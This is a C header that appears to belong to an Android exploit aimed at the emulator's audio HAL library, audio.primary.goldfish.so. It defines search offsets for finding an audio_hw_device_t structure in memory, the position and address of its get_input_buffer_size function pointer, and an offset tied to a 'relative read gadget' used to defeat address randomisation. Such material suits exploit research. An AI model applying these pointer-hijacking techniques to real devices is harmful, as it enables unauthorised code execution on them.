#ifndef __DEFS_H__
#define __DEFS_H__

//The starting offset from which the audio_hw_device_t template is searched for
#define START_OFFSET (-1)

//The ending offset until which the audio_hw_device_t is searched for
#define MAX_OFFSET (-30000)

//The offset, in DWORDs, of the pointer to the get_input_buffer_size function
//from the beginning of the audio_hw_device_t structure.
#define GET_INPUT_BUFFER_SIZE_OFFSET (26)

//The relative address of the original get_input_buffer_size function in audio.primary.goldfish.so
#define RELATIVE_ADDRESS_OF_GET_INPUT_BUFFER_SIZE (0x8FF)

//The offset between the function pointer read using the R0 relative read gadget,
//and the base address of the audio.primary.goldfish.so library.
#define READ_FUNCTION_POINTER_OFFSET_FROM_BASE_ADDRESS (0xC91)

namespace android {

//The pattern against which we are trying to match in order to find a audio_hw_device_t instance
static const unsigned char g_audio_hw_device_t_template[] = {

        NOT_ZERO, //tag
        NOT_ZERO, //version
        NOT_ZERO, //module

        //reserved
        ZERO, ZERO, ZERO, ZERO,
        ZERO, ZERO, ZERO, ZERO,
        ZERO, ZERO, ZERO, ZERO,

        NOT_ZERO, //close

        ZERO, //get_supported_devices

        //rest of function pointers
        NOT_ZERO, NOT_ZERO, NOT_ZERO, NOT_ZERO, NOT_ZERO,
        NOT_ZERO, NOT_ZERO, NOT_ZERO, NOT_ZERO, NOT_ZERO,
        NOT_ZERO, NOT_ZERO, NOT_ZERO, NOT_ZERO, NOT_ZERO,
        NOT_ZERO, NOT_ZERO

};

}

#endif
